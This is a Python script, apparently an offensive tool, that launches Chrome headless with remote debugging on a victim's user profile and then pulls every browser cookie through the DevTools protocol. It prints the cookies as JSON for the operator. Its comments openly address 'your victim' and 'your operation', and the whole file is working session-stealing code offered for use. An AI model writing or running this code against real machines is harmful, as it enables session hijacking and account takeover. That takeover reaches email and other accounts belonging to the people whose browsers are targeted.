import os
import shutil
import signal
import sys
import time

import json
import subprocess

import requests
import websocket

# Edit this if you want to use a profile other than the default Chrome profile. Usually the profiles are called "Profile 1" etc. To list Chrome profiles, look in the Chrome User Data Directory for your OS.
# If you don't know what this is, don't change it.
PROFILE_NAME = "Default"

REMOTE_DEBUGGING_PORT = 9222
GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"})

# Edit these if your victim has a wacky Chrome install.
CHROME_CMD = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
USER_DATA_DIR = r"%LOCALAPPDATA%\Google\Chrome\User Data"

CHROME_DEBUGGING_CMD = """\"{chrome}\" --headless --user-data-dir="{user_data_dir}" https://gmail.com --remote-debugging-port=9222""".format(
    chrome=CHROME_CMD,
    user_data_dir=USER_DATA_DIR
)

print(CHROME_DEBUGGING_CMD)

def summon_forbidden_protocol():
    """IT COMES"""

    # Supress stdout and stderr from the Chrome process so it doesn't
    # pollute our cookie output, for your copy/pasting convenience.
    process = subprocess.Popen(CHROME_DEBUGGING_CMD,
                               shell=True,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)

    # Hey some people have slow computers, quite possibly because of
    # all the malware you're running on them.
    time.sleep(5)
    return process

def hit_that_secret_json_path_like_its_1997():
    response = requests.get("http://localhost:{port}/json".format(port=REMOTE_DEBUGGING_PORT))
    websocket_url = response.json()[0].get("webSocketDebuggerUrl")
    return websocket_url

def gimme_those_cookies(ws_url):
    ws = websocket.create_connection(ws_url)
    ws.send(GET_ALL_COOKIES_REQUEST)
    result = ws.recv()
    ws.close()

    # Parse out the actual cookie object from the debugging protocol object.
    response = json.loads(result)
    cookies = response["result"]["cookies"]

    return cookies

def cleanup(chrome_process):
    # Kill the PID + 1 because the actual PID will just be bash spawning Chrome.
    # I SURE HOPE there's no race condition, causing this to kill some other
    # innocent PID, crashing the victim's computer and ruining your operation.

    os.kill(chrome_process.pid + 1, signal.SIGTERM)

if __name__ == "__main__":
    forbidden_process = summon_forbidden_protocol()
    secret_websocket_debugging_url = hit_that_secret_json_path_like_its_1997()

    cookies = gimme_those_cookies(secret_websocket_debugging_url)

    # Sleep for a sec so we don't get "Killed" in output.
    time.sleep(1)

    cleanup(forbidden_process)


    print(json.dumps(cookies,indent=4, separators=(',', ': '), sort_keys=True))